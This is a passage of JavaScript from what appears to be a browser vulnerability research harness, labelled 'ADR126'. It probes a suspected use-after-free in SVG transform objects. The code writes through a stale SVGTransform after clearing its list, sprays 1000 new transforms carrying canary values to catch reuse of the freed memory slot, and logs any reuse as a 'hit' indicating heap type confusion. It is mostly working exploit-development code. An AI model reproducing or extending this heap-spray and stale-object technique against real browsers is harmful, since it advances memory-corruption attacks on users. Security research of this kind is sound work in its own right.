    L('ADR126 f1: baseVal.clear() done. av.N='+TL_av.numberOfItems,'info');

    // T_av0 is now stale (its item was removed from the list)
    var postClear_tx=T_av0.matrix.e;
    L('ADR126 f1: T_av0.tx after clear='+postClear_tx,'info');

    // Time stale write
    var t=timeWrite(function(i){T_av0.setTranslate(i+77777,i);},'ADR126 f1: T_av0 stale write after baseVal.clear()',500);

    // Read back
    var storedVal=T_av0.matrix.e;
    L('ADR126 f1: T_av0.tx after stale writes='+storedVal,'info');

    // Does CTM reflect the stored value?
    var ctm0=g.getScreenCTM();
    L('ADR126 f1: g.getScreenCTM().e after stale writes='+ctm0.e.toFixed(2),'info');

    // Spray with createSVGTransform to try to hit the freed slot
    var SPRAY_CANARY=0xDEAD;
    var spray=[];
    for(var i=0;i<1000;i++){
      var t2=svg.createSVGTransform();
      t2.setTranslate(SPRAY_CANARY+i,SPRAY_CANARY+i+1000);
      spray.push(t2);
    }
    L('ADR126 f1: sprayed 1000 createSVGTransform()','info');

    // Read back animVal TearOff — if slot reused, it would show spray canary
    var postSpray_tx=T_av0.matrix.e;
    L('ADR126 f1: T_av0.tx after spray='+postSpray_tx,'info');
    if(postSpray_tx>=SPRAY_CANARY&&postSpray_tx<SPRAY_CANARY+2000){
      L('★★★ ADR126: T_av0 TearOff READS FROM SPRAYED SLOT! IsoHeap confusion!','hit');
      L('★★★ ADR126: postSpray_tx='+postSpray_tx+' (= SPRAY_CANARY+'+( postSpray_tx-SPRAY_CANARY)+')','hit');
    } else if(Math.abs(postSpray_tx-storedVal)<1){
      L('ADR126: T_av0 unchanged by spray. Holds its own value.','info');
    } else {
      L('ADR126: T_av0 changed to unexpected value='+postSpray_tx+' (not spray, not stored)','warn');
    }

    // Try writing to the spray objects to contaminate T_av0
    // Only works if they share the same C++ SVGTransform
    for(var i=0;i<spray.length;i++) spray[i].setTranslate(0xBEEF+i,0);
    var postWriteSprays=T_av0.matrix.e;
    L('ADR126 f1: T_av0.tx after writing all spray objects='+postWriteSprays,'info');
    if(postWriteSprays>=0xBEEF&&postWriteSprays<0xBEEF+1000){
      L('★★★ ADR126: SPRAY WRITE CONTAMINATED T_av0! Same C++ SVGTransform!','hit');
    }

    spray=null;
    svg.remove();
  });
};
